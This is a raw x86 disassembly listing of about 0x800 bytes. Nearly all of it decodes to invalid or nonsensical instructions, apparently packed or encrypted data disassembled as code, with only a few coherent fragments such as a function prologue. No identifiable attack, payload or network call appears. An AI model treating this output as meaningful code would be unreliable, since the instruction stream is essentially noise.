  4051c2:	or     eax,0x601490d3
  4051c7:	cmp    eax,0x7134a011
  4051cc:	add    eax,DWORD PTR [edx+0x1e]
  4051cf:	aaa    
  4051d0:	push   cs
  4051d1:	push   0xdee38251
  4051d6:	jmp    0x49f9:0x8620fb47
  4051dd:	lods   eax,DWORD PTR ds:[esi]
  4051de:	fldcw  WORD PTR [eax+ebx*2+0x2353373f]
  4051e5:	loope  0x40524d
  4051e7:	sub    cl,al
  4051e9:	and    dl,BYTE PTR [edi-0x20]
  4051ec:	or     eax,0xfd0928a8
  4051f1:	mov    eax,ds:0x976684d4
  4051f6:	cmc    
  4051f7:	inc    ecx
  4051f8:	sbb    ecx,DWORD PTR [esi-0x6a2dea85]
  4051fe:	and    edx,DWORD PTR [esi]
  405200:	pop    edi
  405201:	bound  eax,QWORD PTR [edi]
  405203:	in     eax,0xfd
  405205:	cld    
  405206:	jno    0x4051cb
  405208:	pop    eax
  405209:	fist   DWORD PTR [eax]
  40520b:	mov    ecx,0x4c5fe11b
  405210:	loop   0x40526e
  405212:	or     BYTE PTR [edx],al
  405214:	sub    eax,0xd82eff54
  405219:	push   ebp
  40521a:	fidivr WORD PTR [esi+0x1dcaab82]
  405220:	xchg   BYTE PTR ds:0xb7f86ba8,al
  405226:	sahf   
  405227:	mov    edi,DWORD PTR [ecx]
  405229:	in     al,0x71
  40522b:	mov    WORD PTR [eax-0x74b560b5],cs
  405231:	mov    esi,0x2a06ace8
  405236:	mov    WORD PTR [ebx-0x54],ds
  405239:	push   edx
  40523a:	leave  
  40523b:	push   cs
  40523c:	add    eax,0xad1e725
  405241:	pushf  
  405242:	xchg   edx,eax
  405243:	test   al,ch
  405245:	jnp    0x405253
  405247:	xchg   DWORD PTR [edi+0x2],eax
  40524a:	adc    al,0x2c
  40524c:	ins    DWORD PTR es:[edi],dx
  40524d:	pop    ecx
  40524e:	jno    0x40526b
  405250:	shr    DWORD PTR [eax+0x6dcdc2f],0x6e
  405257:	cwde   
  405258:	addr16 inc esi
  40525a:	xchg   edx,eax
  40525b:	inc    esp
  40525c:	das    
  40525d:	mov    edi,0x22f08b63
  405262:	(bad)  
  405263:	jb     0x4052cd
  405265:	(bad)  
  405267:	hlt    
  405268:	dec    edi
  405269:	sub    DWORD PTR [eax+0x6d142193],ebp
  40526f:	cmp    bh,BYTE PTR [eax+ebx*4-0x5a]
  405273:	inc    esi
  405274:	sub    esp,DWORD PTR [eax-0x53]
  405277:	adc    eax,0xcbbb87e2
  40527c:	cmp    BYTE PTR [ebx-0x29200aa4],bl
  405282:	cli    
  405283:	stc    
  405284:	or     edi,esp
  405286:	xor    DWORD PTR [ecx+0x2a1c66ff],ebp
  40528c:	jbe    0x405282
  40528e:	add    ebp,DWORD PTR [esi-0x2142bca]
  405294:	retf   
  405295:	jns    0x40528a
  405297:	fsubr  QWORD PTR [ecx+eax*4]
  40529a:	out    dx,al
  40529b:	mov    ch,0x1c
  40529d:	mov    ebx,0x73de54bf
  4052a2:	(bad)  [eax+0x2c]
  4052a5:	stos   BYTE PTR es:[edi],al
  4052a6:	js     0x405291
  4052a8:	xor    al,0xd6
  4052aa:	dec    edx
  4052ab:	pop    ds
  4052ac:	arpl   WORD PTR [edi+0xda9fb4a],bp
  4052b2:	mov    cl,0xce
  4052b4:	sbb    dh,BYTE PTR [edi-0x68]
  4052b7:	mov    eax,DWORD PTR [esp+edx*4+0x41]
  4052bb:	jb     0x405295
  4052bd:	stos   DWORD PTR es:[edi],eax
  4052be:	data16 and BYTE PTR [ebp-0x75f75895],0x54
  4052c6:	sbb    eax,0xd0a43aa2
  4052cb:	loop   0x405254
  4052cd:	lods   al,BYTE PTR ds:[esi]
  4052ce:	fwait
  4052cf:	in     eax,0xc3
  4052d1:	icebp  
  4052d2:	ret    0x3946
  4052d5:	ds enter 0x65c9,0xad
  4052da:	imul   edi,DWORD PTR [esi-0x255f0bde],0xfffffff9
  4052e1:	fcmovbe st,st(7)
  4052e3:	xor    eax,0x30719383
  4052e8:	into   
  4052e9:	retf   
  4052ea:	popf   
  4052eb:	mov    WORD PTR [ebx-0x6a],cs
  4052ee:	xchg   esp,eax
  4052ef:	sub    edi,DWORD PTR [ecx+0x19]
  4052f2:	push   ss
  4052f3:	cmp    ch,al
  4052f5:	dec    eax
  4052f6:	mov    eax,ds:0x514f86aa
  4052fb:	repz or eax,0x232eca60
  405301:	xchg   al,bl
  405303:	rcl    BYTE PTR [edi+edi*1],1
  405306:	xor    esp,DWORD PTR [ebp+0x49ada151]
  40530c:	or     al,0x32
  40530e:	push   0xf70e808d
  405313:	fdiv   QWORD PTR [edx+0x742bf809]
  405319:	test   eax,0x64960429
  40531e:	pop    ss
  40531f:	cmp    eax,0xf8af418d
  405324:	aas    
  405325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405326:	rol    edx,0x82
  405329:	imul   esi,DWORD PTR [eax+0x58],0xffffffb6
  40532d:	test   DWORD PTR [edi],esp
  40532f:	sbb    DWORD PTR [edx+0x63],esi
  405332:	lahf   
  405333:	inc    ecx
  405334:	inc    esi
  405335:	cmp    ch,al
  405337:	or     al,0x6b
  405339:	sbb    BYTE PTR cs:[edx-0x62e1a8f5],0x4d
  405341:	daa    
  405342:	cwde   
  405343:	hlt    
  405344:	popa   
  405345:	mov    bh,0xf0
  405347:	jecxz  0x40530b
  405349:	into   
  40534a:	fimul  WORD PTR [ecx+0x60aaddf0]
  405350:	(bad)  
  405351:	mov    eax,ds:0x6dd64954
  405356:	pusha  
  405357:	fs push ebx
  405359:	and    al,0xeb
  40535b:	jb     0x405369
  40535d:	pop    ebx
  40535e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40535f:	mov    dh,BYTE PTR [ebx-0x24a72a40]
  405365:	push   ss
  405366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405367:	xchg   ebx,eax
  405368:	mov    eax,0xc74fae9f
  40536d:	pop    esp
  40536e:	dec    edi
  40536f:	mov    ds:0x63950bc3,al
  405374:	adc    eax,DWORD PTR [edx-0x38]
  405377:	fnsave [edx-0x2aea179d]
  40537d:	shrd   DWORD PTR [esi+0x2ceaea10],edi,0xe9
  405385:	mov    dh,0x7a
  405387:	into   
  405388:	iret   
  405389:	ja     0x4053ec
  40538b:	hlt    
  40538c:	adc    DWORD PTR [eax],eax
  40538e:	jmp    0x405330
  405390:	pop    ds
  405391:	xchg   ebp,eax
  405392:	cmp    dh,bl
  405394:	shr    bl,cl
  405396:	aaa    
  405397:	sub    eax,0x6330b958
  40539c:	sub    esi,esi
  40539e:	jns    0x4053b0
  4053a0:	scas   al,BYTE PTR es:[edi]
  4053a1:	cmc    
  4053a2:	test   DWORD PTR [ebx-0x3c],esp
  4053a5:	rcr    DWORD PTR [esp+edx*8+0x56],0x1d
  4053aa:	fidiv  DWORD PTR [edx+edi*4+0x21]
  4053ae:	outs   dx,BYTE PTR ds:[esi]
  4053af:	shl    bh,1
  4053b1:	sub    cl,ch
  4053b3:	(bad)  
  4053b4:	mov    esi,0x4b78b5b
  4053b9:	outs   dx,DWORD PTR ds:[esi]
  4053ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053bb:	push   eax
  4053bc:	mov    ds:0xf6e6e47c,eax
  4053c1:	je     0x40539b
  4053c3:	pop    ss
  4053c4:	add    eax,DWORD PTR [esi-0x1bb767c3]
  4053ca:	mov    ?,WORD PTR [edi+0x58]
  4053cd:	adc    edx,esp
  4053cf:	push   esp
  4053d0:	xor    bl,BYTE PTR [eax-0x2e2e3ded]
  4053d6:	and    eax,0x9126b766
  4053db:	jnp    0x40541d
  4053dd:	mov    dh,BYTE PTR [edx]
  4053df:	mov    ch,0x6
  4053e1:	bndstx [edi+0x7ba1dee3],bnd1
  4053e8:	cmp    ah,dh
  4053ea:	in     eax,dx
  4053eb:	sbb    eax,0x29c1712e
  4053f0:	adc    ah,BYTE PTR [eax+ecx*1]
  4053f3:	retf   0xc899
  4053f6:	mov    al,0x5b
  4053f8:	or     DWORD PTR [edi-0x47],edi
  4053fb:	idiv   DWORD PTR [ebp-0x25]
  4053fe:	adc    eax,0x669bd9b7
  405403:	outs   dx,BYTE PTR ds:[esi]
  405404:	jo     0x405466
  405406:	dec    edi
  405407:	sub    BYTE PTR [esp+edi*4+0x1f],ch
  40540b:	(bad)  
  40540c:	enter  0xe726,0x54
  405410:	je     0x405405
  405412:	imul   ecx,DWORD PTR [ecx+ecx*8-0x606dea31],0x1600c629
  40541d:	pop    es
  40541e:	ja     0x4053b9
  405420:	push   eax
  405421:	test   al,0xf4
  405423:	(bad)  
  405424:	div    BYTE PTR [ecx]
  405426:	pop    ebp
  405427:	xchg   BYTE PTR [ebp+0x26],ch
  40542a:	icebp  
  40542b:	xor    BYTE PTR [eax+0x30],bl
  40542e:	push   0xa4ef760d
  405433:	sub    eax,DWORD PTR [edx-0x4921e7ca]
  405439:	test   DWORD PTR [ecx-0x34233ac3],ecx
  40543f:	jg     0x40544a
  405441:	xchg   BYTE PTR [edx+eiz*1-0x7e6fb965],bl
  405448:	and    al,0xe7
  40544a:	xor    BYTE PTR [edx],dh
  40544c:	sbb    eax,0x4b668e25
  405451:	ror    BYTE PTR [ebx-0x4c],0xe3
  405455:	push   es
  405456:	cmp    edx,DWORD PTR [edx+0x6a]
  405459:	mov    cs,WORD PTR [edx]
  40545b:	xchg   ecx,eax
  40545c:	dec    edi
  40545d:	lea    eax,[eax-0xed95235]
  405463:	mov    BYTE PTR [ecx],cl
  405465:	retf   
  405466:	inc    ebp
  405467:	icebp  
  405468:	inc    eax
  405469:	dec    DWORD PTR [ebp+eax*2-0x5def4929]
  405470:	lods   al,BYTE PTR ds:[esi]
  405471:	xchg   ebp,eax
  405472:	mov    cs,WORD PTR [esi]
  405474:	pop    ebx
  405475:	test   eax,0xd4c69098
  40547a:	lahf   
  40547b:	(bad)  [edx+0x5e34889d]
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e784
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e6eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	xlat   BYTE PTR ds:[ebx]
  4054a9:	inc    ebx
  4054aa:	mov    edi,0x70371063
  4054af:	jo     0x40545b
  4054b1:	jle    0x405523
  4054b3:	jo     0x40549e
  4054b5:	je     0x405469
  4054b7:	sahf   
  4054b8:	out    dx,al
  4054b9:	inc    ecx
  4054ba:	adc    cl,dh
  4054bc:	adc    al,0x64
  4054be:	jg     0x4054ab
  4054c0:	cmp    eax,0x2101984a
  4054c5:	push   esi
  4054c6:	int3   
  4054c7:	scas   al,BYTE PTR es:[edi]
  4054c8:	outs   dx,BYTE PTR ds:[esi]
  4054c9:	xor    al,0x9a
  4054cb:	fidiv  WORD PTR [esi-0x60]
  4054ce:	into   
  4054cf:	jo     0x405481
  4054d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054d2:	jae    0x4054ab
  4054d4:	fisttp WORD PTR [esi-0x20]
  4054d7:	pop    ecx
  4054d8:	xor    BYTE PTR ds:0x59df461f,bl
  4054de:	adc    DWORD PTR [edx+0x46],ecx
  4054e1:	push   eax
  4054e2:	mov    dh,0x9
  4054e4:	retf   0x5d3c
  4054e7:	repnz cmc 
  4054e9:	into   
  4054ea:	std    
  4054eb:	pop    ss
  4054ec:	test   BYTE PTR [ebp-0x392742b3],cl
  4054f2:	inc    eax
  4054f3:	mov    eax,DWORD PTR [eax]
  4054f5:	add    al,0xc2
  4054f7:	xchg   BYTE PTR [eax],dh
  4054f9:	xor    BYTE PTR [esi-0x73046efb],dl
  4054ff:	mov    BYTE PTR [ebx-0x4a],0x75
  405503:	adc    BYTE PTR [eax+edx*1],bl
  405506:	or     al,0x45
  405508:	fsub   st,st(3)
  40550a:	or     al,0x97
  40550c:	es sub esp,ebp
  40550f:	sbb    al,0xbe
  405511:	inc    eax
  405512:	adc    esp,edx
  405514:	popf   
  405515:	imul   ebp,DWORD PTR [esi+ebp*2-0x3afa4c9f],0xf186b6e1
  405520:	lock dec edx
  405522:	std    
  405523:	mov    dh,0x7
  405525:	add    eax,0x6177ed23
  40552a:	pushf  
  40552b:	(bad)  
  40552c:	(bad)  
  40552d:	ins    DWORD PTR es:[edi],dx
  40552e:	xor    edx,DWORD PTR [eax+0x7f]
  405531:	lods   eax,DWORD PTR gs:[esi]
  405533:	mov    bh,0xd
  405535:	xor    dl,0x7c
  405538:	sub    DWORD PTR [eax-0x13077263],edx
  40553e:	fs addr16 pop eax
  405541:	jl     0x40552e
  405543:	test   DWORD PTR [edx],esi
  405545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405546:	stos   DWORD PTR es:[edi],eax
  405547:	adc    ecx,edx
  405549:	or     edi,DWORD PTR [edi]
  40554b:	push   ds
  40554c:	dec    edx
  40554d:	xchg   BYTE PTR [edi],cl
  40554f:	xchg   edi,eax
  405550:	(bad)  [eax-0x30]
  405553:	dec    sp
  405555:	and    eax,0x18961549
  40555a:	push   0x5
  40555c:	adc    al,0xfb
  40555e:	xor    DWORD PTR ds:0x5b57715b,esp
  405564:	sbb    BYTE PTR [edi-0x5db7d06],al
  40556a:	pushf  
  40556b:	sbb    BYTE PTR [ebp-0x2d9e3228],0x91
  405572:	or     ch,ch
  405574:	fld    TBYTE PTR [ebx+0x1231ea06]
  40557a:	mov    dl,0xfe
  40557c:	iret   
  40557d:	jge    0x405557
  40557f:	mov    bh,0x6b
  405581:	and    eax,0xab629474
  405586:	call   0x7287:0x2ea78c6f
  40558d:	dec    ebx
  40558e:	loopne 0x4055ba
  405590:	mov    ecx,0x4bc081d3
  405595:	scas   al,BYTE PTR es:[edi]
  405596:	arpl   si,bx
  405598:	xor    eax,0x4565b710
  40559d:	pusha  
  40559e:	aam    0xa1
  4055a0:	enter  0x80e5,0x18
  4055a4:	dec    ebp
  4055a5:	mov    ds:0xb2b7ca12,al
  4055aa:	imul   ecx,DWORD PTR [edx-0x7d],0x60
  4055ae:	sbb    al,bh
  4055b0:	mov    dl,0xa3
  4055b2:	pop    eax
  4055b3:	call   0xb48ad5bf
  4055b8:	(bad)  
  4055b9:	adc    BYTE PTR [esi-0x35],bh
  4055bc:	int    0x99
  4055be:	inc    ecx
  4055bf:	pop    ebp
  4055c0:	call   0x330462af
  4055c5:	fldcw  WORD PTR [edx+0x7dbbf65a]
  4055cb:	popa   
  4055cc:	cs mov esi,0x25158bec
  4055d2:	aaa    
  4055d3:	adc    bh,BYTE PTR [edi+0x1b76acac]
  4055d9:	sub    dl,BYTE PTR [esi+eiz*2]
  4055dc:	sbb    eax,0x9f18defe
  4055e1:	jmp    0xb723:0xa5a911d
  4055e8:	xor    BYTE PTR [edx+0x23],cl
  4055eb:	sbb    al,0x5e
  4055ed:	jns    0x4055d5
  4055ef:	out    0xab,eax
  4055f1:	jae    0x405573
  4055f3:	xchg   dl,ah
  4055f5:	cmp    eax,0x8aa8c1e3
  4055fa:	clc    
  4055fb:	mov    ch,0xcb
  4055fd:	sbb    ah,BYTE PTR [edi-0x9525690]
  405603:	pop    edi
  405604:	retf   0xd1c1
  405607:	lahf   
  405608:	loop   0x40565e
  40560a:	dec    ebp
  40560b:	mov    ds:0x57c0319,al
  405610:	aaa    
  405611:	cmp    eax,DWORD PTR [eax]
  405613:	jbe    0x405600
  405615:	(bad)  
  405616:	repnz std 
  405618:	pusha  
  405619:	fmul   st(7),st
  40561b:	pop    ds
  40561c:	jbe    0x4055ec
  40561e:	pop    ds
  40561f:	fbld   TBYTE PTR [edx+0x72]
  405622:	gs out 0x26,eax
  405625:	sbb    BYTE PTR [esi],cl
  405627:	repz das 
  405629:	fadd   DWORD PTR [esi+0x6a]
  40562c:	sub    DWORD PTR [esi],0xa5175a4b
  405632:	inc    eax
  405633:	sub    eax,0xd7a7b426
  405638:	mov    eax,ds:0xd11f663c
  40563d:	jecxz  0x4056a6
  40563f:	cwde   
  405640:	pop    edx
  405641:	lods   al,BYTE PTR ds:[esi]
  405642:	xchg   edi,eax
  405643:	sub    cl,bl
  405645:	or     DWORD PTR [edi+0x4b],eax
  405648:	lea    esi,[esi+0x1cf95abc]
  40564e:	pop    ebx
  40564f:	in     eax,dx
  405650:	inc    ecx
  405651:	je     0x405613
  405653:	push   ebx
  405654:	test   DWORD PTR [eax-0x67fccc11],esi
  40565a:	neg    esp
  40565c:	mov    edx,0xcb8822de
  405661:	(bad)  
  405662:	popa   
  405663:	shl    dh,cl
  405665:	lods   al,BYTE PTR ds:[esi]
  405666:	dec    eax
  405667:	cwde   
  405668:	xchg   ecx,eax
  405669:	cmp    DWORD PTR [ebp-0x39],esi
  40566c:	(bad)  
  40566d:	stc    
  40566e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40566f:	dec    eax
  405670:	repz sbb al,0x77
  405673:	xor    BYTE PTR [esi],bl
  405675:	cwde   
  405676:	xchg   BYTE PTR [eax+0x5dbab3ca],dh
  40567c:	fild   DWORD PTR [edx+eax*1-0x66fd5225]
  405683:	mov    ebp,0x522dc25d
  405688:	imul   ebx,DWORD PTR [eax+ebp*8-0x49],0xffffffe9
  40568d:	inc    eax
  40568e:	pop    esp
  40568f:	mov    BYTE PTR [edi+esi*2],ah
  405692:	lods   al,BYTE PTR ds:[esi]
  405693:	mov    ecx,0xdda6c61d
  405698:	and    eax,DWORD PTR [ebx]
  40569a:	fcmovnu st,st(7)
  40569c:	(bad)  [ebx+0x1fd27c31]
  4056a2:	jl     0x40568d
  4056a4:	int    0x1f
  4056a6:	jg     0x405693
  4056a8:	xchg   ebp,eax
  4056a9:	jmp    0x7ce0:0x86f63e7d
  4056b0:	cld    
  4056b1:	(bad)  
  4056b2:	out    0x85,al
  4056b4:	sub    al,BYTE PTR ss:[ebx+edi*1+0x6058e1d6]
  4056bc:	mov    dl,BYTE PTR [edi-0x69485fbe]
  4056c2:	in     al,dx
  4056c3:	mov    BYTE PTR [eax-0x79],ch
  4056c6:	cwde   
  4056c7:	jnp    0x4056b5
  4056c9:	push   ebp
  4056ca:	sub    BYTE PTR [eax-0x56],dh
  4056cd:	out    0xd9,eax
  4056cf:	fbstp  TBYTE PTR [edx-0x61]
  4056d2:	ds enter 0xdd31,0xe9
  4056d7:	and    al,0x42
  4056d9:	sbb    BYTE PTR [esi],0xa9
  4056dc:	enter  0x8c75,0xf5
  4056e0:	jo     0x405735
  4056e2:	in     eax,0x2c
  4056e4:	push   ecx
  4056e5:	pop    edi
  4056e6:	lahf   
  4056e7:	pop    ebx
  4056e8:	repz add al,0x13
  4056eb:	mov    eax,0x521a1df4
  4056f0:	mov    al,0xbe
  4056f2:	sbb    DWORD PTR [esi+ebp*4-0x669f9521],edx
  4056f9:	ds pop es
  4056fb:	xchg   DWORD PTR [edi+edx*4+0x6d2e5ff0],edx
  405702:	cld    
  405703:	dec    esp
  405704:	xor    ebp,eax
  405706:	out    dx,eax
  405707:	jo     0x4056d6
  405709:	ret    
  40570a:	push   edx
  40570b:	loope  0x405747
  40570d:	nop
  40570e:	fild   WORD PTR fs:[ecx+edx*8]
  405712:	add    dl,bh
  405714:	(bad)  
  405715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405716:	aam    0x61
  405718:	frstor [ebx-0x6a85884a]
  40571e:	sbb    eax,0x90b81225
  405723:	(bad)  
  405724:	jle    0x4056fd
  405726:	dec    esp
  405727:	aas    
  405728:	push   esp
  405729:	add    BYTE PTR [ebx-0x77],0x58
  40572d:	and    ebp,DWORD PTR es:[edx+0x64]
  405731:	jmp    0x71a45612
  405736:	(bad)  
  405739:	in     al,dx
  40573a:	test   BYTE PTR [edx-0x12],0x62
  40573e:	cld    
  40573f:	hlt    
  405740:	(bad)
  405745:	jle    0x4057a4
  405747:	inc    eax
  405748:	pushf  
  405749:	int    0x27
  40574b:	shl    BYTE PTR [esp+ecx*1],1
  40574e:	mov    esp,0x2a989112
  405753:	adc    eax,0xa808887f
  405758:	call   DWORD PTR [ecx-0x14]
  40575b:	xchg   esi,eax
  40575c:	or     DWORD PTR [edi+0x65],eax
  40575f:	mov    al,0x8e
  405761:	xor    BYTE PTR [ecx-0xa125661],0x2e
  405768:	(bad)  
  405769:	jecxz  0x4057bc
  40576b:	movzx  eax,WORD PTR ds:0x42fd86
  405772:	and    eax,DWORD PTR ds:0x42fd7a
  405778:	mov    ds:0x42fd86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx+0x209c91be],eax
  405790:	fst    QWORD PTR [edi+0x4a]
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	test   eax,0xca346ab0
  40579f:	mov    esp,0x9963e22
  4057a4:	jno    0x40572d
  4057a6:	dec    esp
  4057a7:	fdivr  QWORD PTR [ecx+0x34]
  4057aa:	sub    al,0xdc
  4057ac:	and    cl,BYTE PTR ss:[edx]
  4057af:	cld    
  4057b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057b1:	ror    DWORD PTR [edi+0x196ebd2d],1
  4057b7:	mov    edi,DWORD PTR [ecx-0x34314ac9]
  4057bd:	mov    ebp,0x37613374
  4057c2:	stos   DWORD PTR es:[edi],eax
  4057c3:	xchg   esi,eax
  4057c4:	pushf  
  4057c5:	mov    esi,0xcd99b09e
  4057ca:	xchg   DWORD PTR [esi-0x67],esp
  4057cd:	sbb    BYTE PTR [eax-0x7924301a],dl
  4057d3:	call   0x842:0xf449d1b3
  4057da:	add    BYTE PTR [edx-0x79],cl
  4057dd:	add    eax,0xab5e9a15
  4057e2:	inc    eax
  4057e3:	pusha  
  4057e4:	test   DWORD PTR [ebx+0x71e8b973],esi
  4057ea:	(bad)  
  4057eb:	cmc    
  4057ec:	xchg   edx,eax
  4057ed:	push   0x809bcdb3
  4057f2:	mov    eax,0xb74c9fed
  4057f7:	es inc edx
  4057f9:	jp     0x4057e1
  4057fb:	sbb    esp,esp
  4057fd:	pop    edx
  4057fe:	retf   
  4057ff:	mov    al,ds:0xdfc77150
  405804:	xchg   ebp,eax
  405805:	xlat   BYTE PTR ds:[ebx]
  405806:	sbb    ecx,DWORD PTR [edx+0x4cb1348c]
  40580c:	fcmovnb st,st(7)
  40580e:	test   bl,cl
  405810:	imul   esi,DWORD PTR [esi-0x45],0x958beba2
  405817:	aad    0x9c
  405819:	cli    
  40581a:	pop    eax
  40581b:	aas    
  40581c:	aaa    
  40581d:	cli    
  40581e:	cmp    ebx,0x20
  405821:	iret   
  405822:	call   0xe79f:0xec239644
  405829:	mov    ebx,0x11bbbe0c
  40582e:	adc    DWORD PTR [ebp-0x59],0xe3c6ce24
  405835:	mov    DWORD PTR [ecx+0x3e],0x1a7f025a
  40583c:	dec    ebp
  40583d:	inc    esp
  40583e:	jbe    0x4057c0
  405840:	jp     0x4058b8
  405842:	fnstcw WORD PTR [bx+di-0x2051]
  405847:	int3   
  405848:	idiv   ecx
  40584a:	in     al,dx
  40584b:	mov    DWORD PTR [edi+0x2d903494],esi
  405851:	and    al,0x50
  405854:	xchg   esp,eax
  405855:	inc    ebx
  405856:	pop    ecx
  405857:	out    0xae,al
  405859:	xor    cl,dh
  40585b:	pop    edi
  40585c:	or     al,0x72
  40585e:	mov    al,0x99
  405860:	fistp  QWORD PTR [esi+0x46]
  405863:	pop    eax
  405864:	imul   BYTE PTR [eax-0x8]
  405867:	aad    0xd
  405869:	pop    edx
  40586a:	jns    0x40587e
  40586c:	stos   BYTE PTR es:[edi],al
  40586d:	add    BYTE PTR [eiz*4-0x2a064616],bl
  405874:	into   
  405875:	inc    ecx
  405876:	je     0x405801
  405878:	mov    cl,0x9f
  40587a:	jb     0x405832
  40587c:	inc    esp
  40587d:	jne    0x405853
  40587f:	stos   BYTE PTR es:[edi],al
  405880:	push   esi
  405881:	call   0xbd7b:0x21d8f510
  405888:	lea    edi,[edx]
  40588a:	rcr    DWORD PTR [si+0x6ca0],cl
  40588f:	shl    DWORD PTR [ebp-0x31],1
  405892:	dec    ecx
  405893:	inc    edi
  405894:	xchg   esp,eax
  405895:	adc    ebx,ecx
  405897:	test   al,0x4f
  405899:	push   es
  40589a:	out    dx,al
  40589b:	cdq    
  40589c:	inc    ebp
  40589d:	aam    0xfa
  40589f:	sar    DWORD PTR [esi],1
  4058a1:	push   edx
  4058a2:	jne    0x405911
  4058a4:	push   es
  4058a5:	pop    eax
  4058a6:	into   
  4058a7:	push   edx
  4058a8:	push   ds
  4058a9:	(bad)  
  4058aa:	(bad)  
  4058ab:	in     eax,dx
  4058ac:	push   esi
  4058ad:	jg     0x405830
  4058af:	rcr    BYTE PTR [ebx-0x3f],0xc9
  4058b3:	mov    ah,0x68
  4058b5:	ret    0xd9aa
  4058b8:	cmp    esp,DWORD PTR [edx-0x2ab5e543]
  4058be:	mov    bl,0xee
  4058c0:	out    0x50,al
  4058c2:	push   ebx
  4058c3:	add    edi,ebp
  4058c5:	das    
  4058c6:	hlt    
  4058c7:	add    al,0x35
  4058c9:	push   cs
  4058ca:	xchg   ah,dh
  4058cc:	outs   dx,DWORD PTR ds:[esi]
  4058cd:	push   es
  4058ce:	push   ebp
  4058cf:	sbb    BYTE PTR [esi+0x1e4e487f],dh
  4058d5:	je     0x4058a1
  4058d7:	push   0xf
  4058d9:	xchg   ebx,eax
  4058da:	sbb    ah,BYTE PTR [ebx]
  4058dc:	stos   DWORD PTR es:[edi],eax
  4058dd:	in     eax,0x29
  4058df:	mov    ds:0x18903f6d,eax
  4058e4:	div    DWORD PTR [eax]
  4058e6:	jmp    0x4058b9
  4058e8:	mov    esp,0x6c235325
  4058ed:	jp     0x4058af
  4058ef:	popa   
  4058f0:	push   edi
  4058f1:	icebp  
  4058f2:	out    dx,eax
  4058f3:	mov    ebp,0xdf3d54f5
  4058f8:	push   esp
  4058f9:	mov    eax,ds:0x2d0e9dc
  4058fe:	clc    
  4058ff:	sub    eax,0x47748232
  405904:	scas   al,BYTE PTR es:[edi]
  405905:	sbb    eax,0xa3838351
  40590a:	cmp    al,0x23
  40590c:	retf   
  40590d:	jg     0x405920
  40590f:	push   ebp
  405910:	xchg   ebx,eax
  405911:	or     eax,0xafca712e
  405916:	std    
  405917:	mov    edx,0xfe65c822
  40591c:	les    edi,FWORD PTR [ebp-0x7be94756]
  405922:	hlt    
  405923:	and    dh,cl
  405925:	dec    ebx
  405926:	push   eax
  405927:	loope  0x405943
  405929:	outs   dx,DWORD PTR ds:[esi]
  40592a:	ds (bad) 
  40592c:	jmp    0x405964
  40592e:	cs mov esi,0xd33d4c59
  405934:	fstp   DWORD PTR [ecx]
  405936:	xchg   ebx,eax
  405937:	xchg   ebp,eax
  405938:	retf   
  405939:	push   ebp
  40593a:	ret    
  40593b:	test   DWORD PTR [eax+0x5c],edi
  40593e:	hlt    
  40593f:	lock cs dec edi
  405942:	call   DWORD PTR [ebp+0x42f5881c]
  405948:	sbb    eax,0xf39f15f0
  40594d:	pop    es
  40594e:	repnz rol DWORD PTR [edi+0x80f1b06],cl
  405955:	sar    BYTE PTR [eax],0x5
  405958:	popf   
  405959:	stos   DWORD PTR es:[edi],eax
  40595a:	(bad)  
  40595b:	mov    ebx,0xa87622f2
  405960:	add    BYTE PTR [esi-0x3c],bl
  405963:	sub    DWORD PTR es:[edx],ebp
  405966:	not    ch
  405968:	sub    DWORD PTR [esi-0x25609f0e],0x7409c28b
  405972:	shr    DWORD PTR [esi],1
  405974:	sbb    DWORD PTR fs:[eax],esp
  405977:	mov    bl,BYTE PTR [edx+ebp*8-0x54fc09c4]
  40597e:	xor    DWORD PTR [edx+0x1b02add9],0x757349a3
  405988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405989:	cwde   
  40598a:	mov    esp,0x1ad8e0e1
  40598f:	loope  0x4059a1
  405991:	add    BYTE PTR [edx+0x6c4e9444],al
  405997:	xchg   ebx,eax
  405998:	adc    DWORD PTR [ecx-0x3f],eax
  40599b:	dec    esp
  40599c:	imul   eax,edi,0xffffff99
  40599f:	xchg   ebx,eax
  4059a0:	sbb    eax,0x30db6007
  4059a5:	(bad)  
  4059a7:	out    0x58,eax
  4059a9:	ins    DWORD PTR es:[edi],dx
  4059aa:	cmp    ebx,eax
  4059ac:	sub    edi,ebp
  4059ae:	and    eax,0xa12e2573
  4059b3:	test   DWORD PTR [eax+0x2e6af0d3],0x206bf21b
  4059bd:	add    BYTE PTR [eax-0x7896b3fb],bh
  4059c3:	lods   al,BYTE PTR ds:[esi]
  4059c4:	sub    al,cl
  4059c6:	push   edi
  4059c7:	inc    ebp
  4059c8:	test   al,0x8b
  4059ca:	dec    esi
  4059cb:	loope  0x405a2d
  4059cd:	adc    BYTE PTR [esi+ecx*8],ch
  4059d0:	imul   edi,edx,0xfffffff9
  4059d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059d4:	aas    
  4059d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059d6:	fpatan 
  4059d8:	bound  ebx,QWORD PTR [esi]
  4059da:	out    dx,eax
  4059db:	fs call 0x487e:0x6a8c12b2
  4059e3:	outs   dx,BYTE PTR ds:[esi]
  4059e4:	push   esi
  4059e5:	push   ds
  4059e6:	test   BYTE PTR [ebx],ah
  4059e8:	in     al,dx
